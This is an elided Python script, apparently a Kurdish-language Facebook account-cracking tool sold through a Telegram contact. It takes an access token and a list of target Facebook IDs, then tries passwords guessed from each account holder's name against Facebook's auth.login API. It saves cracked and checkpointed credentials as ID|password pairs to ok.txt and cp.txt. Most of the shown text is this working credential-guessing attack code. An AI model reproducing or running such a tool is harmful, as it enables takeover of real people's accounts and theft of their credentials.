...
def chk():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @LO1STT.......")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
\033[90m--------------------------------------------------"""
	print logo
	print("")
	print("\033[93m[1]\033[90mStart")
	print("\033[93m[0]\033[90mLogout")
	print("")
	log_sel()
	
def log_sel():
	sel = raw_input("\033[90;1m  HALBZHERA: \033[91;1m")
	if sel == "":
...
def token():
    ...
    try:
        ...
        print("")
        print("")
        token = raw_input("\033[90;1m TOKEN DANE : \033[91;1m")
...
\033[90m--------------------------------------------------"""
    ...
    print("")
    print("\033[93;1m[1]\033[90mStart Cracking")
    print("")
    menu_option()
    
def menu_option():
	select = raw_input("\033[90;1m  HALBZHERA : ")
	if select =="1":
		crack1()
	elif select =="2":
		crack()
...
def crack1():
	...
	print("")
	print("")
	print("\033[93;1m[1]\033[90mCRACK LAREGAY ID ")
	print("")
	crack_select1()
...
def crack_select1():
	...
	if select =="1":
		...
		print("")
		try:
			id_limit = int(raw_input("\033[90;1m  BNUSA --> [1] : \033[91;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[90;1m   ID  [FB] DANE(\033[91;1m%s\033[91;1m) : \033[93;1m"%(t))
			try:
			...
			print("\033[90;1m  HAMW ID YAKAN : \033[0;90m%s\033[0;90m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
...
\033[90m--------------------------------------------------"""
	print logo
	print("")
	print("\033[90;1m  HAMW ID YAKAN  : \033[90;1m"+str(len(id)))
	print("\033[90;1m  CRACK DASTE PE KRD\x1b[0m")
	print("\033[91m-----------------LOSTid-----------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;97m[Checkpoint] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;97m[Checkpoint] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;97m[Checkpoint] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;97m[Checkpoint] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;97m[Checkpoint] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[Successful] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;97m[Checkpoint] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[Successful] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;97m[Checkpoint] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1] + '1212'
																	api = 'https://b-api.facebook.com/method/auth.login'
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[Successful] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;97m[Checkpoint] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
